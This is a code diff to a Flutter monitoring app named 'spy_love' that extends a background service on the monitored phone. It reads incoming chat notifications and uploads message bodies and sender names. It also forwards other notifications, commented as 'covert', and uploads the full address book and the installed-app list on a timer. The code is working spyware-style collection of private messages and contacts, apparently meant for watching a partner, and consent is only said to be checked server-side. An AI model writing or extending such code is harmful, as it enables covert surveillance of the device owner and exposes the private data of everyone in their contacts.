@@ -6,6 +6,8 @@ import 'package:flutter/foundation.dart';
 import 'package:geolocator/geolocator.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:spy_love/features/monitoring/collectors_bridge.dart';
+import 'package:spy_love/features/monitoring/contacts_bridge.dart';
+import 'package:spy_love/features/monitoring/installed_apps_bridge.dart';
 import 'package:spy_love/features/monitoring/geofence_math.dart';
 import 'package:spy_love/features/monitoring/monitored_device_storage.dart';
 import 'package:spy_love/features/monitoring/notification_bridge.dart';
@@ -66,6 +68,8 @@ class MonitoringService {
   DateTime? _lastNetworkUpload;
   DateTime? _lastDeviceInfoUpload;
   DateTime? _lastAppUsageUpload;
+  DateTime? _lastContactsUpload;
+  DateTime? _lastAppInventoryUpload;
   String? _lastBatteryKey;
   String? _lastNetworkKey;
 
@@ -141,6 +145,10 @@ class MonitoringService {
     for (final item in AppPermission.dataCollection) {
       await item.permission.request();
     }
+
+    // Address book (contact.snapshot). Gated by the `contacts` consent scope
+    // server-side; we only ask for the OS permission here.
+    await Permission.contacts.request();
 
     final location = AppPermission.monitoring.firstWhere((p) => p.scope == 'location');
     await location.permission.request();
@@ -336,24 +344,163 @@ class MonitoringService {
     if (!_owns(epoch)) return;
     _notificationSub = NotificationBridge.notificationStream.listen((event) {
       final package = event['package'] as String? ?? '';
-      if (!_isMessagingApp(package)) return;
+      final removed = event['removed'] == true;
+      final nowIso = DateTime.now().toUtc().toIso8601String();
+      final title = event['title'];
+      final text = event['text'];
+      final bigText = (event['big_text'] as String?)?.trim();
+      final body = (bigText != null && bigText.isNotEmpty) ? bigText : text;
 
+      if (_isMessagingApp(package)) {
+        // Messaging apps: emit a richer message.* event so the monitor can show
+        // real threads, and keep message.notification as the fallback the chat
+        // path already understands. Removed notifications are not treated as
+        // messages (a dismissed chat alert isn't a new message).
+        if (removed) return;
+        unawaited(
+          _upload([
+            {
+              'event_type': 'message.received',
+              'payload': {
+                'app': package,
+                'package': package,
+                'thread_id': title?.toString() ?? package,
+                'contact_name': title,
+                'direction': 'incoming',
+                'body': body,
+                'title': title,
+                'when': event['when'],
+              },
+              'idempotency_key': 'msg-${event['idempotency_key']}',
+              'timestamp': nowIso,
+            },
+            {
+              'event_type': 'message.notification',
+              'payload': {
+                'app': package,
+                'title': title,
+                'text': text,
+                'when': event['when'],
+              },
+              'idempotency_key': event['idempotency_key'],
+              'timestamp': nowIso,
+            },
+          ]),
+        );
+        return;
+      }
+
+      // Covert / non-chat notifications go to the dedicated notification feed,
+      // distinct from the chat path (consent scope: notifications).
       unawaited(
         _upload([
           {
-            'event_type': 'message.notification',
+            'event_type': removed ? 'notification.removed' : 'notification.posted',
             'payload': {
               'app': package,
-              'title': event['title'],
-              'text': event['text'],
+              'package': package,
+              'title': title,
+              'text': body,
+              'category': event['category'],
+              'channel_id': event['channel_id'],
+              'notification_key': event['notification_key'],
               'when': event['when'],
             },
             'idempotency_key': event['idempotency_key'],
-            'timestamp': DateTime.now().toUtc().toIso8601String(),
+            'timestamp': nowIso,
           },
         ]),
       );
     });
+  }
+
+  /// Uploads the device address book as `contact.snapshot` (consent scope:
+  /// `contacts`, enforced server-side). No photo blobs are sent.
+  Future<void> _syncContacts() async {
+    if (!Platform.isAndroid) return;
+    if (!await Permission.contacts.isGranted) return;
+
+    try {
+      final now = DateTime.now();
+      if (_lastContactsUpload != null &&
+          now.difference(_lastContactsUpload!) < const Duration(hours: 1)) {
+        return;
+      }
+
+      final contacts = await ContactsBridge.getContacts();
+      if (contacts.isEmpty) return;
+
+      final sanitized = contacts
+          .map((c) => {
+                'contact_id': c['contact_id'],
+                'name': c['name'] ?? '',
+                'phones': c['phones'] ?? const <String>[],
+                'emails': c['emails'] ?? const <String>[],
+              })
+          .toList();
+
+      final hourBucket = now.millisecondsSinceEpoch ~/ 3600000;
+      await _upload([
+        {
+          'event_type': 'contact.snapshot',
+          'payload': {
+            'contacts': sanitized,
+            'count': sanitized.length,
+          },
+          'idempotency_key': 'contacts-$hourBucket-${sanitized.length}',
+          'timestamp': now.toUtc().toIso8601String(),
+        },
+      ]);
+      _lastContactsUpload = now;
+    } catch (e) {
+      debugPrint('Contacts sync failed: $e');
+    }
+  }
+
+  /// Uploads the installed-app inventory as `app_inventory.snapshot` (consent
+  /// scope maps to `app_usage`, enforced server-side). Icons are omitted — the
+  /// backend strips them anyway.
+  Future<void> _syncAppInventory() async {
+    if (!Platform.isAndroid) return;
+
+    try {
+      final now = DateTime.now();
+      if (_lastAppInventoryUpload != null &&
+          now.difference(_lastAppInventoryUpload!) < const Duration(hours: 6)) {
+        return;
+      }
+
+      final apps = await InstalledAppsBridge.getInstalledApps(includeSystem: true);
+      if (apps.isEmpty) return;
+
+      final sanitized = apps
+          .map((a) => {
+                'package': a['package'],
+                'name': a['name'],
+                'system': a['system'] == true,
+                if (a['version'] != null) 'version': a['version'],
+              })
+          .where((a) => (a['package'] ?? '').toString().isNotEmpty)
+          .toList();
+      if (sanitized.isEmpty) return;
+
+      final hourBucket = now.millisecondsSinceEpoch ~/ 3600000;
+      await _upload([
+        {
+          'event_type': 'app_inventory.snapshot',
+          'payload': {
+            'apps': sanitized,
+            'count': sanitized.length,
+            'include_system': true,
+          },
+          'idempotency_key': 'appinv-$hourBucket-${sanitized.length}',
+          'timestamp': now.toUtc().toIso8601String(),
+        },
+      ]);
+      _lastAppInventoryUpload = now;
+    } catch (e) {
+      debugPrint('App inventory sync failed: $e');
+    }
   }
 
   bool _isMessagingApp(String package) {
@@ -387,6 +534,8 @@ class MonitoringService {
     await _syncNetwork();
     await _syncDeviceInfo();
     await _syncAppUsage();
+    await _syncAppInventory();
+    await _syncContacts();
   }
 
   Future<void> _refreshPauseState() async {
